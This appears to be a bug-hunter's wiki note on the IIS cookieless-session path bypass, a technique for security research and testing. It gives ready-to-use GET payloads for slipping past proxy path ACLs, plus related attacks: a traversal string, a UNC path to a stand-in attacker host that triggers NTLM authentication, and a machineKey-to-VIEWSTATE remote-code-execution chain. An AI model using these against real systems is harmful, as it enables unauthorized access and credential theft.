---
title: IIS cookieless path-restriction bypass
slug: iis-cookieless-bypass
created_utc: 2026-05-13T00:00:00Z
updated_utc: 2026-05-13T00:00:00Z
tags: [technique/server-side, technique/proxy-bypass]
inbound: []
---

# IIS cookieless path-restriction bypass

Soroush Dalili (NCC Group).

## Pattern
Inject `/(S(anytext))/` (or `(A(...))` anonymous-id, or `(F(...))`
form-auth) anywhere mid-path. ASP.NET's `RemoveAppPathModifier` strips
the cookieless-session segment before route resolution. So:

```
/webform/(S(x))/protected   →  reads as  /webform/protected
```

Lets you bypass nginx/IIS path ACLs that prefix-match on the literal
path before IIS processes it.

## Preconditions
- IIS + ASP.NET application.
- Reverse-proxy / WAF / nginx path-allowlist runs in front and only
  inspects the literal path segment.

## Detection
- Test injection of `/(S(x))/`, `/(A(x))/`, `/(F(x))/` mid-path on any
  IIS host with path-based access control.

## Triggering
```
GET /webform/(S(x))/protected.aspx
GET /api/(A(x))/admin
```

## Related primitives (Ep 32, 52)
- IIS tilde-path XSS (Pavel/isec) — reflected resolved tilde-path with
  cookieless session-token segment.
- IIS cookieless app-pool confusion — execute code in different app
  pool's privilege context.
- IIS short-name enumeration via `shortscan` (bitquark) + GPT for full
  filename prediction.
- IIS SSRF → NTLM: `\\\\attacker-host\\C$\\...` triggers Windows NTLM
  auth.
- IIS virtual-dir traversal: `/sso/..%2f` → root of mapped backend.
- ASP.NET `web.config` machineKey → ysoserial.net VIEWSTATE → RCE; see
  [[aspnet-machinekey-rce]].

## Seen in the wild
- Multiple LHE wins; PortSwigger Top 10 2022 #2.

## References
- soroush.me — IIS cookieless bypass
- isec.pl — original cookieless tilde XSS
- Critical Thinking Podcast Eps 32, 52
